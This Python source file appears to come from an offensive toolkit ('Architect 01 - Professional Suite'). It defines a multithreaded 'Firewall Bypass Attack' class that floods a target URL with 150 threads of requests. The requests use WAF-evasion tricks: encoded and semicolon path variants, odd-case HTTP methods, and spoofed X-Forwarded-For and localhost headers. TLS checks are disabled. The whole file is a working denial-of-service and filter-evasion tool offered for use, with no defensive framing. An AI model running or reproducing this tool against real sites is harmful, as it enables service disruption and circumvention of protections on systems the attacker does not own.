#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Firewall Bypass Attack - Techniques to bypass WAF/firewalls
Architect 01 - Professional Suite
"""

import requests
import threading
import time
import random
from colorama import Fore, Style
from core.utils.useragents import get_random_ua

class FirewallBypass:
    """
    Firewall Bypass Attack
    - Uses encoding tricks
    - Case manipulation
    - Path traversal techniques
    - Null byte injection (for older systems)
    """
    
    def __init__(self, target_url, threads=150):
        self.target_url = target_url
        self.threads = threads
        self.running = True
        self.request_count = 0
        
        # Bypass techniques
        self.path_techniques = [
            "",  # normal
            "/./",  # self directory
            "//",  # double slash
            "/%2f/",  # URL encoded slash
            "/%2e/",  # URL encoded dot
            "/;/",  # semicolon
            "/..;/",  # path traversal with semicolon
        ]
        
        self.case_techniques = [
            "GET", "get", "GeT", "gEt",  # method case
        ]
        
        self.header_injection = [
            "X-Forwarded-For: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1",
            "X-Remote-Addr: 127.0.0.1",
            "X-Client-IP: 127.0.0.1",
            "X-Host: localhost",
            "X-Forwarded-Host: localhost",
        ]
        
    def attack_worker(self):
        """Worker thread for firewall bypass"""
        session = requests.Session()
        
        while self.running:
            try:
                # Build URL with bypass technique
                url = self.target_url
                technique = random.choice(self.path_techniques)
                
                if technique:
                    # Insert technique into path
                    if '/?' in url:
                        parts = url.split('/?')
                        url = parts[0] + technique + '?' + parts[1]
                    else:
                        url = url + technique
                
                # Generate headers
                ua = get_random_ua()
                headers = {'User-Agent': ua}
                
                # Add injection headers
                if random.random() > 0.5:
                    inj = random.choice(self.header_injection)
                    key, value = inj.split(': ')
                    headers[key] = value
                
                # Random case for method
                method = random.choice(self.case_techniques)
                
                # Send request with different method case
                if method.upper() == 'GET':
                    response = session.get(url, headers=headers, timeout=10, verify=False)
                else:
                    # Custom method via request
                    response = session.request(method, url, headers=headers, timeout=10, verify=False)
                
                self.request_count += 1
                
                if self.request_count % 50 == 0:
                    print(f"{Fore.GREEN}   ╰─❯ [{threading.current_thread().name}] Req: {self.request_count} | Tech: {technique if technique else 'normal'}{Style.RESET_ALL}")
                
                # Random delay
                time.sleep(random.uniform(0.05, 0.2))
                
            except Exception:
                session = requests.Session()
                time.sleep(0.1)
    
    def start(self):
        """Start the firewall bypass attack"""
        print(f"{Fore.YELLOW}\n   ╰─❯ Starting Firewall Bypass Attack on {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Threads: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Techniques: Path Manipulation, Case Variation, Header Injection{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Press Ctrl+C to stop\n{Style.RESET_ALL}")
        
        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()
        
        # Start workers
        for i in range(self.threads):
            worker = threading.Thread(target=self.attack_worker)
            worker.daemon = True
            worker.start()
        
        # Monitor
        try:
            last_count = 0
            while self.running:
                time.sleep(5)
                new_req = self.request_count - last_count
                last_count = self.request_count
                print(f"{Fore.CYAN}   ╰─❯ Requests: {self.request_count} | Rate: {new_req/5:.1f} rps{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        print(f"{Fore.RED}\n   ╰─❯ Stopping Firewall Bypass Attack...{Style.RESET_ALL}")
        print(f"{Fore.RED}   ╰─❯ Total requests: {self.request_count}{Style.RESET_ALL}")
